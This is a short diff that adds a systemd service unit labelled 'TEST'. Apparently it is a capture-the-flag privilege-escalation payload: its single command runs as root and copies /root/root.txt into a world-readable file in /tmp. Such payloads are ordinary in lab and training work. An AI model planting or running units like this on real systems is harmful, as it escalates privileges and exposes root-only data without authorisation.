@@ -1,0 +1,8 @@
+[Unit]
+Description=TEST
+
+[Service]
+ExecStart=/bin/sh -c "/bin/cat /root/root.txt > /tmp/test2.txt"
+
+[Install]
+WantedBy=multi-user.target
